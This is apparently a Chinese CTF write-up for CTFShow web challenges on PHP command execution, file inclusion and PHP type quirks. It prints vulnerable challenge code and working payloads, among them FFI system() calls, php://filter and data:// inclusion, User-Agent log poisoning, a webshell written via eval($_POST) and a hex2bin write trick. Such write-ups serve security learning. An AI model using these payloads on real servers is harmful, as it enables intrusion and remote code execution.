<h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><p>PHP7.4的FFI详见：<a href="https://yq1ng.github.io/z_post/%E7%94%B1-RCTF-2019-Nextphp%E5%AD%A6%E4%B9%A0phpinfo%E4%B8%AD%E7%9A%84i%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%8F%8APHP7-4%E6%96%B0%E7%89%B9%E6%80%A7-FFI/">RCTF2019-Nextphp</a></p>
<p><code>c=FFI::cdef("int system(const char *command);")-&gt;system('ls / &gt;&gt; 1.txt'); </code></p>
<p><code>c=FFI::cdef("int system(const char *command);")-&gt;system('/readflag &gt;&gt; 1.txt');</code></p>
<h2 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h2><p><code>if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\'|\"|\</code>|||,/‘, $code))`，过滤很多鸭。环境变量可以帮忙</p>
<p>工作目录应该是<code>/var/www/html</code>  ，<code>~A</code>字母等同于0</p>
<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/20210318222706.png" alt="image-20210318222704903"></p>
<h2 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h2><h1 id="文件包含-LFI"><a href="#文件包含-LFI" class="headerlink" title="文件包含(LFI)"></a>文件包含(LFI)</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p>
<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>过滤了php，可以用<code>data</code>协议执行系统函数，payload：<code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; &lt;?php system('cat flag.php');</code></p>
<h2 id="web80-amp-81"><a href="#web80-amp-81" class="headerlink" title="web80&amp;81"></a>web80&amp;81</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">":"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>日志包含，bp抓包改UA头<code>&lt;?php system("ls");?&gt;</code>，接着cat或者<code>&lt;?php system(base64 fl0g.php';?)</code></p>
<h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><h1 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><blockquote>
<p>数组绕过正则表达式<br>返回完整匹配次数（可能是0），或者如果发生错误返回FALSE</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>没想到数组，那就记下来，payload：<code>?num[]=1</code></p>
<h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/^php$/im'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/^php$/i'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'hacker'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'nonononono'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>payload:<code>?cmd=%0aphp</code>（%0a就是换行or<code>\n</code>）<br>很有意思，首先要知道<code>^$</code>是匹配一段文本中每行的开始和结束位置，在看他俩的介绍</p>
<blockquote>
<p><code>^</code> 匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置<br><code>$</code> 匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.8i160rqgpag.png" alt="i m"></p>
</blockquote>
<p>第一次匹配是多行（成功），第二次一行（失败），传入payload正好可以绕过</p>
<h2 id="web90-92-93-94-95"><a href="#web90-92-93-94-95" class="headerlink" title="web90 | 92 | 93 | 94 | 95"></a>web90 | 92 | 93 | 94 | 95</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/[a-z]|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no no no!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no no no!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p><code>strpos()</code> –&gt; strpos — 查找字符串首次出现的位置\</p>
<ul>
<li><code>strpos ( string $haystack , mixed $needle [, int $offset = 0 ] ) : int</code><br>返回 needle 在 haystack 中首次出现的数字位置<br><code>offset</code> –&gt; 如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。 如果是负数，搜索会从字符串结尾指定字符数开始(-3：从倒数第三个字符开始查找)。</li>
</ul>
</blockquote>
<blockquote>
<p><code>intval()</code> –&gt;  获取变量的整数值(向下取整)(<code>ceil()</code>向上取整)</p>
<ul>
<li><code>intval ( mixed $var [, int $base = 10 ] ) : int</code><br>通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</li>
<li>Note:<br>如果 base 是 0，通过检测 var 的格式来决定使用的进制：<blockquote>
<p>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>将使用 10 进制 (decimal)。</p>
</blockquote>
</li>
</ul>
</blockquote>
<p>PHP很有意思的特性，大多函数总是会修剪多余的空白字符，所以只需要用八进制，并在数值前加上空格即可，payload：<code>?num= 010574</code><br>补：92Hint:<br>intval()函数如果<code>$base</code>为0则<code>$var</code>中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以</p>
<h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><p>这题看见直接懵逼了，可怕的三目运算，其实不想记录的，纠结一下还是写上吧，算是代码混淆，吓走你哈哈哈</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">;</span><span class="token comment">//如果GET到参数就用POST得的flag参数覆盖</span>
<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token single-quoted-string string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">:</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">;</span>
<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token single-quoted-string string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token single-quoted-string string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>中间两行GET没用，不传flag<br>payload：<code>GET: ?a=a</code> <code>POST: HTTP_FLAG=flag</code></p>
<h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//向数组里面插入随机数</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p><code>in_array()</code> –&gt; 检查数组中是否存在某个值</p>
<ul>
<li><code>in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool</code><br>大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较</li>
<li><code>strict</code> 如果第三个参数 strict 的值为 TRUE 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同<br>可以理解为不加true就是弱比较(==)，加上true就是强比较(===)</li>
</ul>
</blockquote>
<p>payload：<code>GET: n=1.php</code> <code>POST: content=&lt;?php eval($_POST[1]);?&gt;</code>之后蚁剑</p>
<h2 id="web100-101"><a href="#web100-101" class="headerlink" title="web100 | 101"></a>web100 | 101</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//flag in class ctfshow;</span>
<span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>预期解：</p>
<ol>
<li>and与&amp;&amp;的区别<br><code>$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</code><br>只需要第一个是数值即可使v0为数值<br><code>$v0=is_numeric($v1) &amp;&amp; is_numeric($v2) &amp;&amp; is_numeric($v3);</code><br>需要全部都是数值</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.reflectionclass.php">反射类</a><br>不过最简单的就是new一个类在输出，payload：<code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code><br>100非预期：<br>看到<code>eval</code>就应该想起来前面练习的RCE<del>没想起来</del>方法较多<br>payload：<br><code>?v1=1&amp;v2=&amp;v3=?&gt;&lt;?=`tail ctfshow.php`;</code><br><code>?v1=1&amp;v2=?&gt;&lt;?php echo `ls`?&gt;/*&amp;v3=;*/</code></li>
</ol>
<h2 id="web102-103"><a href="#web102-103" class="headerlink" title="web102 | 103"></a>web102 | 103</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>考点：<code>hex2bin()</code><br>大意就是找出一个经过16进制编码后一句话，其不带任何字母，再经过<code>call_user_func()</code>调用<code>hex2bin()</code>转换回去写到文件里面进行getshell</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token single-quoted-string string">'&lt;?=`cat *`;'</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// PD89YGNhdCAqYDs=</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//这里直接用去掉=的base64</span>
<span class="token comment">//输出   5044383959474e6864434171594473</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>payload：(v2前面随便加两个数字，绕substr的)<br><code>GET: v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</code> <code>POST: v1=hex2bin</code></p>
<h2 id="web104-106"><a href="#web104-106" class="headerlink" title="web104 | 106"></a>web104 | 106</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
